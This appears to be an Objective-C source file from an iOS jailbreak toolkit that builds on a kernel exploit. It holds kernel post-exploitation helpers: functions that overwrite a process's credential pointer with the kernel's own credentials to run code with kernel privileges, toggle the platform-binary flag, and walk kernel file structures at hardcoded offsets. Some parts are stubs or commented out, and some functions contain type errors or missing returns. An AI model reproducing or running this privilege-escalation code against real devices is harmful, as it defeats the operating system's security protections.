//
//  kernel_u.m
//  reton
//
//  Created by Luca on 18.02.21.
//

#import <Foundation/Foundation.h>
#include "../include/lib/tq/kapi.h"
#include "exploit/cicuta/cicuta_virosa.h"

#include "log.hpp"
#include "kernel_utils.h"
#include "utils.h"

#include <mach/mach_traps.h>
#include <mach/mach.h>


#include "lib/tq/iosurface.h"
#include "lib/tq/kapi.h"
#include "lib/tq/k_offsets.h"
#include "lib/tq/tq_common_p.h"
#include "lib/tq/utils.h"
#include "lib/tq/k_utils.h"

#if 1
#define MAX_CHUNK 0xff0
#else
#define MAX_CHUNK 0x2000
#endif

mach_port_t tfp0 = MACH_PORT_NULL;
uint64_t kreads = 0;
uint64_t kwrites = 0;

typedef struct {
    struct {
        uint64_t data;
        uint32_t reserved : 24,
                    type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;

bool set_platform_binary(kptr_t proc, bool set) {
    bool ret = false;
    if(!KERN_POINTER_VALID(proc)) return 0;
    kptr_t task_struct_addr = read_64(proc + 0x10);
    if(!KERN_POINTER_VALID(task_struct_addr)) return 0;
    kptr_t task_t_flags_addr = task_struct_addr + 0x3a0;
    uint32_t task_t_flags = read_32(task_t_flags_addr);
    if (set) {
        task_t_flags |= TF_PLATFORM;
    } else {
        task_t_flags &= ~(TF_PLATFORM);
    }
    // write_32((task_struct_addr + 0x3a0), (void*)task_t_flags);
    ret = true;
    return ret;
}

kptr_t give_creds_to_proc_at_addr(kptr_t proc, kptr_t cred_addr){
    kptr_t ret = KPTR_NULL;
    if(KERN_POINTER_VALID(proc) && KERN_POINTER_VALID(cred_addr)){
        kptr_t proc_cred_addr       = proc + OFFSET(proc, p_ucred);
        kptr_t current_cred_addr    = kapi_read_kptr(proc_cred_addr);
        if(KERN_POINTER_VALID(current_cred_addr)){
            kapi_write64(proc_cred_addr, cred_addr);
            ret = current_cred_addr;
        } else manticore_warn("Invalid current_cred_addr!\t\t(0x%llx)\n", current_cred_addr);
    } else manticore_warn("Invalid proc_addr/cred_drr!\t\t(0x%llx - 0x%llx)\n", proc, cred_addr);
    return ret;
}

bool execute_with_credentials(kptr_t proc, kptr_t credentials, void (^function)(void)){
    bool ret = KPTR_NULL;
    if(KERN_POINTER_VALID(proc) && KERN_POINTER_VALID(credentials) && function != NULL){
        kptr_t saved_creds = give_creds_to_proc_at_addr(proc, credentials);
        if(KERN_POINTER_VALID(saved_creds)){
            function();
            ret = give_creds_to_proc_at_addr(proc, saved_creds);
        } else manticore_warn("Invalid saved_creds!\t\t(0x%llx)\n", saved_creds);
    } else manticore_warn("Invalid proc/credentials!\t\t(0x%llx - 0x%llx)\n", proc, credentials);
    return ret;
}

kptr_t get_kernel_cred_addr(){
    kptr_t ret = KPTR_NULL;
    kptr_t kernel_proc_struct_addr = g_exp.kernel_proc;
    if(KERN_POINTER_VALID(kernel_proc_struct_addr)){
        kptr_t kernel_ucred_struct_addr = kapi_read_kptr(kernel_proc_struct_addr + OFFSET(proc, p_ucred));
        if(KERN_POINTER_VALID(kernel_ucred_struct_addr)){
            ret = kernel_ucred_struct_addr;
        } else manticore_warn("Invalid Kernel ucred struct pointer!\n");
    } else manticore_warn("Invalid kernel process struct pointer!\n");
    return ret;
}

bool execute_with_kernel_credentials(void (^function)(void)){
    kptr_t kernel_credentials = get_kernel_cred_addr();
    if(KERN_POINTER_VALID(kernel_credentials)){
        if(execute_with_credentials(g_exp.self_proc, kernel_credentials, function) != true){
            manticore_warn("Execution as kernel failed.");
            return false;
        } else return true;
    }
}


void patch_codesign(){
    printf("* ------- Codesign Patches ------- *\n");
    
    if(look_for_proc_basename("amfid_patched")){
        printf("amfid_patched already running.\n");
        return;
    }
    
    
}


uint64_t proc_of_pid(pid_t pid) {
    //uint64_t proc = read_64(find_allproc()), pd;
    //while (proc) { //iterate over all processes till we find the one we're looking for
    //    pd = read_32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
    //    if (pd == pid) return proc;
    //    proc = read_64(proc);
    //}
    return 0;
}

kptr_t find_vnode_with_fd(kptr_t proc, int fd) {
    kptr_t ret = KPTR_NULL;
    if(fd <= 0 || !KERN_POINTER_VALID(proc)) return 1;
    kptr_t fdp = read_64(proc + 0xf8);
    if(!KERN_POINTER_VALID(fdp)) return 2;
    kptr_t ofp = read_64(fdp + 0x0);
    if(!KERN_POINTER_VALID(ofp)) return 3;
    kptr_t fpp = read_64(ofp + (fd * sizeof(kptr_t)));
    if(!KERN_POINTER_VALID(fpp)) return 4;
    kptr_t fgp = read_64(fpp + 0x10);
    if(!KERN_POINTER_VALID(fgp)) return 5;
    kptr_t vnode = read_64(fgp + 0x38);
    if(!KERN_POINTER_VALID(vnode)) return 6;
    ret = vnode;
    return ret;
}
